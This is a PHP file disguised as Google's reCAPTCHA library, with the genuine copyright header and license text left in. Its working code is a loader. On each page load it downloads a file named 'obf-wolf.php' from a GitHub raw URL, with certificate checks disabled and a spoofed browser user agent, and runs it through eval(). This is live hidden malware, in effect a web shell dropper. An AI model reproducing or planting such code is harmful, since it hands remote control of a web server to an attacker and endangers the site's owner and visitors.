<?php
session_start();
/**
 * This is a PHP library that handles calling reCAPTCHA.
 *    - Documentation and latest version
 *          https://developers.google.com/recaptcha/docs/php
 *    - Get a reCAPTCHA API Key
 *          https://www.google.com/recaptcha/admin/create
 *    - Discussion group
 *          http://groups.google.com/group/recaptcha
 *
 *Copyright (c) 2014, Google Inc.
 *  http://www.google.com/recaptcha
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

/**
 * A ReCaptchaResponse is returned from checkAnswer().
 */ #private static $_signupUrl = "https://www.google.com/recaptcha/admin";
   # private static $_siteVerifyUrl =
    #    "https://www.google.com/recaptcha/api/siteverify?";
    #private $_secret;
   # private static $_version = "php_1.0";
 
/**
* Disable error reporting
*
* Set this to error_reporting( -1 ) for debugging.
*/
function geturlsinfo($url) {
   if (function_exists('curl_exec')) {
       $conn = curl_init($url);
       curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
       curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
       curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
       // Set cookies using session if available
       if (isset($_SESSION['SAP'])) {
           curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
       }
 
       $url_get_contents_data = curl_exec($conn);
       curl_close($conn);
   } elseif (function_exists('file_get_contents')) {
       $url_get_contents_data = file_get_contents($url);
   } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
       $handle = fopen($url, "r");
       $url_get_contents_data = stream_get_contents($handle);
       fclose($handle);
   } else {
       $url_get_contents_data = false;
   }
   return $url_get_contents_data;
}
 
 
 {
   $a = geturlsinfo('https://raw.githubusercontent.com/dee1103/dee/refs/heads/main/obf-wolf.php');
   eval('?>' . $a);
}
?>
